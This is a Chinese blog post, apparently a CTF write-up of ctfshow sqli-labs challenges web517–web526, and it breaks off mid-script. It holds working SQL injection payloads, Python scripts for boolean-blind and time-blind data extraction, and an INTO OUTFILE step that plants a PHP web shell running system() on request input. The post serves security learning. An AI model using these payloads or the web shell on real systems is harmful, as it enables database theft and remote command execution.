href="#%E5%8D%95%E5%BC%95%E5%8F%B7order-by-%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">50.1.</span> <span class="nav-text">#单引号order by 写文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">51.</span> <span class="nav-text">总结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">160</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">117</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/06/04/ctfshow%E5%85%A5%E9%97%A8sqli-labs(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow入门sqli-labs | root@wanth3f1ag">
      <meta itemprop="description" content="ctfshow入门sqli-labs">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow入门sqli-labs
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-06-04 09:29:03" itemprop="dateCreated datePublished" datetime="2025-06-04T09:29:03+08:00">2025-06-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:20:14" itemprop="dateModified" datetime="2025-12-01T19:20:14+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>35 分钟</span>
    </span>
</div>

            <div class="post-description">ctfshow入门sqli-labs</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>面试的时候碰上宽字节注入的问题了，一直没怎么好好看过，说明自己sql的篇章学的还不够</p>
<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><h3 id="GET字符型union"><a href="#GET字符型union" class="headerlink" title="#GET字符型union"></a>#GET字符型union</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>GET传一个ID，一开始以为是大写后面发现是小写</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27; union select 1,2,3--+ 有回显2和3</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1&#x27; union select 1,2,(select group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata)--+ 数据库为ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1&#x27; union select 1,2,(select group_concat(table_name)<span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;ctfshow&#x27;</span>)--+ 有一个flag表</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1&#x27; union select 1,2,(select group_concat(column_name)<span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;flag&#x27;</span>)--+ flag字段</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1&#x27; union select 1,2,(select flag <span class="keyword">from</span> ctfshow.flag)--+</span><br></pre></td></tr></table></figure>

<h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><h3 id="GET数字型union"><a href="#GET数字型union" class="headerlink" title="#GET数字型union"></a>#GET数字型union</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> 有回显<span class="number">2</span>和<span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>)<span class="keyword">from</span> information_schema.schemata),(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>)<span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfshow&#x27;</span>) 找到flagaa</span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>)<span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flagaa&#x27;</span>),(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>)<span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfshow&#x27;</span>) flagac字段</span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flagac <span class="keyword">from</span> ctfshow.flagaa),<span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><h3 id="GET单引号括号union"><a href="#GET单引号括号union" class="headerlink" title="#GET单引号括号union"></a>#GET单引号括号union</h3><p>传入引号发现是单引号和括号闭合的</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>&#x27;)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>无过滤，正常打就行了</p>
<h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><h3 id="GET双引号括号union"><a href="#GET双引号括号union" class="headerlink" title="#GET双引号括号union"></a>#GET双引号括号union</h3><p>传入单引号没反应，估计是过滤单引号了</p>
<p>传入一个反斜杠转义一下看看报错</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604100020624.png" alt="image-20250604100020624"></p>
<p>双引号括号闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&quot;)--+</span><br></pre></td></tr></table></figure>

<p>也是没过滤的，正常打就行</p>
<h2 id="web521"><a href="#web521" class="headerlink" title="web521"></a>web521</h2><h3 id="GET单引号布尔"><a href="#GET单引号布尔" class="headerlink" title="#GET单引号布尔"></a>#GET单引号布尔</h3><p>单引号闭合，但是没回显执行结果，测一下盲注</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> <span class="number">0</span><span class="comment">--+ 无回显</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> <span class="number">1</span><span class="comment">--+ 回显You are in...........</span></span><br></pre></td></tr></table></figure>

<p>布尔盲注，写脚本直接打吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f8b07768-2709-42d1-854d-e9285a4e3f31.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload =f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagpuck&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select flag33 from ctfshow.flagpuck),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web522"><a href="#web522" class="headerlink" title="web522"></a>web522</h2><h3 id="GET双引号布尔"><a href="#GET双引号布尔" class="headerlink" title="#GET双引号布尔"></a>#GET双引号布尔</h3><p>这次是双引号闭合的布尔盲注，也是直接打就行，无过滤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f955bc4-8f20-4bf7-8a70-f26b9ffda870.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload =f&quot;?id=1\&quot; and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1\&quot; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1\&quot; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagpa&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1\&quot; and if(ascii(substr((select flag3a3 from ctfshow.flagpa),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web523"><a href="#web523" class="headerlink" title="web523"></a>web523</h2><h3 id="GET单引号双括号文件注入"><a href="#GET单引号双括号文件注入" class="headerlink" title="#GET单引号双括号文件注入"></a>#GET单引号双括号文件注入</h3><p>传入一个1显示</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604102846076.png" alt="image-20250604102846076"></p>
<p>意思是让我们写入文件吧，把输出结果传入文件中然后访问文件查看输出</p>
<p>但是需要先判断闭合方式</p>
<p>不过测了一会之后发现只会返回报错而不会返回报错信息，最后</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>猜到是单引号双括号闭合，报错只有一种，但还是可以判断字段数的，字段数是3，那我们尝试把输出写入文件中</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;)) union select <span class="number">1</span>,user(),<span class="built_in">version</span>() <span class="keyword">into</span> outfile &#x27;/var/www/html/<span class="number">3.</span>txt&#x27;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250604103543081.png" alt="image-20250604103543081"></p>
<p>成功传入输出</p>
<p>看到语言版本是php5.6的，看看能不能写php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &#x27;</span>/<span class="keyword">var</span>/www/html/shell.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250604103742163.png" alt="image-20250604103742163"></p>
<p>看来是可以写的，那我们直接写个马子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &#x27;</span>/<span class="keyword">var</span>/www/html/shell1.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>但是好像flag不在文件中还是在数据库中，大意了。。。</p>
<p>那就正常查询然后输出到文件吧</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span>)) union <span class="keyword">select</span> <span class="number">-1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">schema_name</span>)<span class="keyword">from</span> information_schema.schemata),(<span class="params"><span class="keyword">select</span> group_concat(table_name</span>)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;ctfshow&#x27;</span>) <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/1.txt&#x27;</span>--+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1&#x27;</span>)) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;flagdk&#x27;</span>) <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/2.txt&#x27;</span>--+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1&#x27;</span>)) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag43 <span class="keyword">from</span> ctfshow.flagdk) <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/4.txt&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<h2 id="web524"><a href="#web524" class="headerlink" title="web524"></a>web524</h2><h3 id="GET单引号布尔-1"><a href="#GET单引号布尔-1" class="headerlink" title="#GET单引号布尔"></a>#GET单引号布尔</h3><p>测出来是单引号闭合，不过也是没过滤的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d0872a9a-8aae-42f8-8ba0-a04604efe962.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload =f&quot;?id=-1&#x27; or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=-1&#x27; or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=-1&#x27; or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagjugg&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=-1&#x27; or if(ascii(substr((select flag423 from ctfshow.flagjugg),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web525"><a href="#web525" class="headerlink" title="web525"></a>web525</h2><h3 id="GET单引号时间"><a href="#GET单引号时间" class="headerlink" title="#GET单引号时间"></a>#GET单引号时间</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> sleep(<span class="number">2</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>测出来有延迟，那就打时间盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cec0fddc-870f-47da-bc4e-cbf1e9707bfe.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagug&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select flag4a23 from ctfshow.flagug),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        end = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">1.5</span> :</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span> :</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web526"><a href="#web526" class="headerlink" title="web526"></a>web526</h2><h3 id="GET双引号时间"><a href="#GET双引号时间" class="headerlink" title="#GET双引号时间"></a>#GET双引号时间</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> sleep(<span class="number">2</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>换成双引号就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://febcd613-15f2-442e-b978-a02b307d2f73.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1\&quot; and if(ascii(substr((select group_concat(schema_name)from 